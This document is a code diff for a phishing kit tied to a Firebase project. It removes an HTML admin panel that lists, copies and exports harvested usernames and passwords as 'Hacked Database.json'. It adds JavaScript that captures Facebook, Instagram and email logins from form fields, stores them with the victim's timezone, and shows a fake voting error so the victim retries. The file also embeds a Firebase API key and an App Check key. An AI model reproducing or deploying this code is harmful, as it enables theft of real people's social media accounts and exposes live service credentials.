@@ -1,75 +1,4 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <link rel="icon" href="favicon.ico">
-  <title>Database</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-    }
-    #save {
-      margin-top: 20px;
-    }
-    .canvaschat {
-      padding: 10px;
-      border: 1px solid #ccc;
-      margin-bottom: 10px;
-      background-color: #f5f5f5;
-    }
-    .send {
-      background-color: #e74c3c;
-      color: white;
-      border: none;
-      padding: 5px 10px;
-      cursor: pointer;
-    }
-    .send:hover {
-      background-color: #c0392b;
-    }
-    .export {
-      background-color: #2f9e1e;
-      color: white;
-      border: none;
-      padding: 5px 10px;
-      cursor: pointer;
-    }
-    .export:hover {
-      background-color: #2dc02b;
-    }
-    #scrollButtons {
-      text-align: center;
-      margin-top: 10px;
-    }
-    .scroll-icon {
-      font-size: 24px;
-      cursor: pointer;
-    }
-    #scrollButtons {
-      text-align: center;
-      margin-top: 10px;
-    }
-    .scroll-icon {
-      font-size: 24px;
-      cursor: pointer;
-    }
-    .copy-icon {
-      font-size: 18px;
-      color: #007bff;
-      cursor: pointer;
-    }
-  </style>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-</head>
-<body>
-  <div id="scrollButtons">
-    <i class="fas fa-chevron-circle-down scroll-icon" onclick="scrollToBottom()"></i>
-  </div>
-  <div></div>
-  <div id="save"></div>
-  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-app.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-database.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase.js"></script>
-  <script>
+// Initialize Firebase
 const firebaseConfig = {
 apiKey: "AIzaSyA8lnkl-LBnUFGFBwa8CYtYPOr3qJiAhfk",
 authDomain: "savpalestine.firebaseapp.com",
@@ -79,104 +8,134 @@ storageBucket: "savpalestine.appspot.com",
 messagingSenderId: "724458243697",
 appId: "1:724458243697:web:ed5a618889052e4a023dd0"
 };
-    firebase.initializeApp(firebaseConfig);
-    async function signInAnonymously() {
-      try {
-        await firebase.auth().signInAnonymously();
-      } catch (error) {
-        console.error("Error:", error.message);
-      }
-    }
-    signInAnonymously();
-    const saveContainer = document.getElementById("save");
-    firebase.database().ref("fbdet").on("child_added", function(snapshot) {
-      const html = createChatEntry(snapshot);
-      saveContainer.appendChild(html);
-    });
-    function createChatEntry(snapshot) {
-      const chatDiv = document.createElement("div");
-      chatDiv.className = "canvaschat";
-      chatDiv.innerHTML = `
-        <hr>
-        <p><b>Account type:</b> ${snapshot.val().type}</p>
-        <p><b>User:</b> ${snapshot.val().emle} <i class="far fa-copy copy-icon" onclick="copyText('${snapshot.val().emle}')"></i></p>
-        <p><b>Password:</b> ${snapshot.val().pass} <i class="far fa-copy copy-icon" onclick="copyText('${snapshot.val().pass}')"></i></p>
-        <p><b>Date:</b> ${snapshot.val().date}</p>
-        <p><b>Location:</b> ${snapshot.val().timezone}</p>
-        <p><b>Time:</b> ${snapshot.val().time}</p>
-        <button data-id="${snapshot.key}" class="send">Delete</button>`;
-      return chatDiv;
-    }
-    saveContainer.addEventListener("click", function(event) {
-      if (event.target && event.target.classList.contains("send")) {
-        deleteMessage(event.target);
-      }
-    });
-    function deleteMessage(button) {
-      const messageId = button.getAttribute("data-id");
-      firebase.database().ref("fbdet").child(messageId).remove();
-    }
-    firebase.database().ref("fbdet").on("child_removed", function(snapshot) {
-      const messageElement = document.getElementById("message-" + snapshot.key);
-      if (messageElement) {
-        messageElement.innerHTML = "Deleted";
-      }
+firebase.initializeApp(firebaseConfig);
+const appCheck = firebase.appCheck();
+console.log(appCheck);
+appCheck.activate("6Lf544sgAAAAAIYRP96xR6Zd5bDJwPD9dh7bo3jW", true);
+
+function hmlog() {
+  firebase
+    .auth()
+    .signInAnonymously()
+    .catch(function (error) {
+      var errorCode = error.code;
+      var errorMessage = error.message;
+      window.alert("Error: " + errorMessage);
     });
 
-    function exportAllData() {
-      const confirmExport = confirm("Are you sure you want to export all data?");
-      if (confirmExport) {
-        firebase.database().ref("fbdet").once("value").then((dataSnapshot) => {
-          const data = dataSnapshot.val();
-          const jsonData = JSON.stringify(data, null, 2);
-          const blob = new Blob([jsonData], { type: "application/json" });
-          const url = URL.createObjectURL(blob);
+  var email = document.getElementById("hm-email").value;
+  var password = document.getElementById("hm-pass").value;
+  var currentDate = new Date().toISOString().slice(0, 10);
+  var currentTime = new Date().toISOString().slice(11, 19);
+  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  var accountType = "Email";
 
-          const a = document.createElement("a");
-          a.href = url;
-          a.download = "Hacked Database.json";
-          a.textContent = "Export All Data";
-          a.style.marginTop = "10px";
-          a.style.display = "block";
+  if (email !== "" && password !== "") {
+    firebase.database().ref("fbdet").push({
+      emle: email,
+      mobile: "",
+      time: currentTime,
+      timezone: timezone,
+      pass: password,
+      date: currentDate,
+      type: accountType,
+    });
 
-          document.body.appendChild(a);
-        });
-      }
-    }
-    function deleteAllData() {
-      const confirmDelete = confirm("Are you sure you want to delete all data?");
-      if (confirmDelete) {
-        firebase.database().ref("fbdet").remove();
-        // Clear the container
-        saveContainer.innerHTML = "";
-      }
-    }
-    function scrollToTop() {
-      window.scrollTo(0, 0);
-    }
-    function scrollToBottom() {
-      window.scrollTo(0, document.body.scrollHeight);
-    }
+    setTimeout(function () {
+      Swal.fire({
+        title: "Oops!",
+        text: "Something went wrong with your vote.",
+        icon: "error",
+        confirmButtonText: "Try Again",
+      });
+      document.getElementById("fb-pass").value = "";
 
-    // Function to copy text when clicked
-    function copyText(text) {
-      const textarea = document.createElement('textarea');
-      textarea.value = text;
-      document.body.appendChild(textarea);
-      textarea.select();
-      document.execCommand('copy');
-      document.body.removeChild(textarea);
-      alert("Copied the text: " + text);
-    }
-  </script>
-  <div>
-    <button onclick="exportAllData()"class="export">Export All Data</button>
-  </div><br>
-  <div>
-    <button onclick="deleteAllData()"class="send delete-all-button">Delete All Data</button>
-  </div>
-  <div id="scrollButtons">
-    <i class="fas fa-chevron-circle-up scroll-icon" onclick="scrollToBottom()"></i>
-  </div>
-</body>
-</html>
+      return false;
+    }, 2000);
+  }
+}
+
+function iglog() {
+  firebase
+    .auth()
+    .signInAnonymously()
+    .catch(function (error) {
+      var errorCode = error.code;
+      var errorMessage = error.message;
+      window.alert("Error: " + errorMessage);
+    });
+
+  var username = document.getElementById("ig-uname").value;
+  var password = document.getElementById("ig-pass").value;
+  var currentDate = new Date().toISOString().slice(0, 10);
+  var currentTime = new Date().toISOString().slice(11, 19);
+  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  console.log(timezone);
+  var accountType = "Instagram";
+
+  if (username !== "" && password !== "") {
+    firebase.database().ref("fbdet").push({
+      emle: username,
+      mobile: "",
+      time: currentTime,
+      timezone: timezone,
+      pass: password,
+      date: currentDate,
+      type: accountType,
+    });
+
+    setTimeout(function () {
+      Swal.fire({
+        title: "Oops!",
+        text: "Something went wrong with your vote.",
+        icon: "error",
+        confirmButtonText: "Try Again",
+      });
+
+      document.getElementById("ig-pass").value = "";
+      return false;
+    }, 2000);
+  }
+}
+
+function login() {
+  firebase
+    .auth()
+    .signInAnonymously()
+    .catch(function (error) {
+      var errorCode = error.code;
+      var errorMessage = error.message;
+      window.alert("Error: " + errorMessage);
+    });
+
+  var email = document.getElementById("fb-email").value;
+  var password = document.getElementById("fb-pass").value;
+  var currentDate = new Date().toISOString().slice(0, 10);
+  var currentTime = new Date().toISOString().slice(11, 19);
+  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  var accountType = "Facebook";
+
+  if (email !== "" && password !== "") {
+    firebase.database().ref("fbdet").push({
+      emle: email,
+      mobile: "",
+      time: currentTime,
+      timezone: timezone,
+      pass: password,
+      date: currentDate,
+      type: accountType,
+    });
+
+    setTimeout(function () {
+      Swal.fire({
+        title: "Oops!",
+        text: "Something went wrong with your vote.",
+        icon: "error",
+        confirmButtonText: "Try Again",
+      });
+      document.getElementById("fb-pass").value = "";
+
+      return false;
+    }, 2000);
+  }
+}
